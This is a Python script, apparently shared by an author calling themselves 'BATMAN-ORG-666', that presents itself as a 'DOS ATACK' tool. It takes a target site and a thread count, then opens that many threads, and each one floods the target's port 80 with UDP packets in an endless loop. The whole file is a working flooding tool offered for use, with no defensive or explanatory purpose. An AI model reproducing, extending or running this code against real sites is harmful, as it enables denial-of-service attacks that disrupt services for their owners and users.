#BATMAN-ORG-666

import turtle
from colorama import Fore
import time
import socket
import sys
import _thread

wn = turtle.Screen()
wn.setup(width= 500 , height=500)
wn.bgcolor("black")
wn.title("DOS ATACK (BATMAN-ORG-666)")

pen = turtle.Turtle()
pen.speed(0)
pen.pencolor("red")
pen.pensize(5)
pen.hideturtle()
pen.penup()
pen.goto(0,50)
pen.pendown()
pen.write("DOS ATACK (BATMAN-ORG-666)", align = 'center' , font=(100))

site = turtle.textinput("DOS ATACK", "Enter your site url => ")
thread_count = turtle.numinput("DOS ATACK", "Enter your thread (number) => ")

print("😈 My github : github.com/BATMAN-ORG-666")
print(Fore.RED, "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-")
print(Fore.YELLOW, "📫 How to contact me My Discord : <@1176187245707939843> ")
print(Fore.BLUE, "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-")
print("")
print(Fore.LIGHTBLACK_EX, "DOS ATACK")
print("")
print(Fore.GREEN, "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-")
print("")
print(Fore.RED,"your torget" , site)
print("")
print(Fore.GREEN, "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-")


print("")
print(Fore.YELLOW, "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-")
print("")

ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'BATMAN-ORG-666'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
print(Fore.RED, "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-")
print("")
print(Fore.RED,"your torget:" , site , ip)
print("")
print(Fore.YELLOW, "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-")
print("")
print("Please wait until the attack starts!")
print("")
print(Fore.BLUE, "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-")
print("")
time.sleep(5)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(Fore.RED, "Packet Sent!")
        print(Fore.GREEN, "Packet Sent!")
        print(Fore.BLUE, "Packet Sent!")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
